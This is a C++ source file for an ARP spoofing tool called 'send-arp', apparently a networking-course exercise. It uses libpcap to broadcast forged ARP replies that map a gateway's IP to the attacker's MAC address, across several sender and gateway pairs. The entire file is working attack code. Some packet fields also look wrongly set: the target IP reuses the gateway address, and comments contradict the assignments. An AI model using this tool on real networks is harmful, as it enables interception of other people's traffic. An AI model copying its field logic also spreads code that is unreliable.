#include <cstdio>
#include <pcap.h>
#include <string>
#include <vector>
#include <cstring>
#include <unistd.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <arpa/inet.h>
#include "ethhdr.h"
#include "arphdr.h"

#pragma pack(push, 1)
struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
    printf("syntax: send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
    printf("sample: send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

Mac getAttackerMac(const char* dev) {
    struct ifreq ifr;
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) {
        perror("socket");
        exit(1);
    }
    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name, dev, IFNAMSIZ-1);
    ioctl(fd, SIOCGIFHWADDR, &ifr);
    close(fd);
    Mac attackerMac = Mac((uint8_t*)ifr.ifr_hwaddr.sa_data);
    printf("Attacker MAC: %s\n", std::string(attackerMac).c_str());
    return attackerMac;
}

void sendArpSpoof(pcap_t* handle, Mac attackerMac, Ip senderIp, Ip targetIp) {
    EthArpPacket packet;

    packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff"); //target mac
    packet.eth_.smac_ = attackerMac; //attacker mac
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Reply);
    packet.arp_.smac_ = attackerMac; //attacker mac
    packet.arp_.sip_ = htonl(targetIp); //gateway ip
					//gateway ip = attacker mac
    packet.arp_.tmac_ = attackerMac; // ff:ff:ff:ff:ff:ff
    packet.arp_.tip_ = htonl(targetIp); // targetip - gateway

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    } else {
        printf("ARP spoofing packet sent successfully to %s\n", std::string(senderIp).c_str());
    }
}

int main(int argc, char* argv[]) {
    if (argc < 4 || argc % 2 != 0) {
        usage();
        return -1;
    }

    char* dev = argv[1];
    printf("Interface: %s\n", dev);

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }

    Mac attackerMac = getAttackerMac(dev);

    std::vector<std::pair<Ip, Ip>> targets;
    for (int i = 2; i < argc; i += 2) {
        targets.push_back(std::make_pair(Ip(argv[i]), Ip(argv[i+1])));
    }

    for (const auto& target : targets) {
        Ip senderIp = target.first;
        Ip gatewayIp = target.second;
        printf("\nSending ARP spoof packet: Sender IP %s, Gateway IP %s\n", 
               std::string(senderIp).c_str(), std::string(gatewayIp).c_str());
        sendArpSpoof(handle, attackerMac, senderIp, gatewayIp);
    }

    pcap_close(handle);
    printf("ARP spoofing attack completed.\n");
    return 0;
}
